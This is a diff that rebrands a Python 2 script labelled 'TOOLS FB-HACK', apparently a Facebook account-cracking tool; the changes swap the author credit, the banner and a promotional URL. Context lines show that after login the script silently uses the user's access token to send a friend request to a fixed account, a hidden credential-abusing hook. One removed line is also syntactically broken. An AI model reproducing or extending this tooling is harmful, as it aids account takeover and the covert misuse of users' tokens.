@@ -1,4 +1,4 @@
-#Note: i Am Not Responsbility!
+#Note: CLB-09 Abdul Basit Kamboh !
 import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, requests, mechanize
 from multiprocessing.pool import ThreadPool
 
@@ -22,7 +22,7 @@ def jalan(z):
         sys.stdout.flush()
         time.sleep(0.01)
 
-logo = '\x1b[1;93m*TOOLS FACEBOOK CLB-09*\n\x1b[1;93m* \x1b[1;97mCLB-09  \x1b[1;91m: \x1b[1;96mCLB-09\x1b[1;97m\n\x1b[1;93m* \x1b[1;97mNote \x1b[1;91m: \x1b[1;96mAbdul Basit Kamboh!\n\x1b[0m\n[*] TOOLS FB-HACK BY CLB-09\n'
+logo = '\x1b[1;93m*TOOLS FACEBOOK CLB-09*\n\x1b[1;93m* \x1b[1;97mTOOLS ABDUL  \x1b[1;91m: \x1b[1;96mBASIT\x1b[1;97m\n\x1b[1;93m* \x1b[1;97mNote \x1b[1;91m: \x1b[1;96mCLB-09\n\x1b[0m\n[*] TOOLS ABDUL BASIT KAMBOH CLB-09\n'
 
 def tik():
     titik = [
@@ -96,7 +96,7 @@ def login():
                 zedd.close()
                 print '\n\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mLogin berhasil'
                 requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
-                os.system('xdg-open https://sck.io/u/URnBfBoJ
+                os.system('xdg-open https://youtube.com/UCuZ3LerXYmrvSKmtuJWutsA')
                 time.sleep(2)
                 menu()
             except requests.exceptions.ConnectionError:
@@ -176,7 +176,7 @@ def pilih():
                     else:
                         if zedd == '5':
                             os.system('rm -rf login.txt')
-                            os.system('xdg-open https://sck.io/u/URnBfBoJ')
+                            os.system('xdg-open https://youtube.com/UCuZ3LerXYmrvSKmtuJWutsA')
                             keluar()
                         else:
                             if zedd == '0':
